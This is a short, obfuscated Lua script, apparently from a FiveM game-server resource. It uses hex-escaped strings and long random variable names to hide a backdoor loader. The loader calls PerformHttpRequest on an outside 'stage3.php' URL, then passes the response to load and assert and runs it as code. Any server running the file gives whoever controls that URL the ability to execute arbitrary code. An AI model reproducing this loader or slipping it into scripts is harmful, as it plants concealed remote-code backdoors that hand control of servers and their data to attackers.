local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)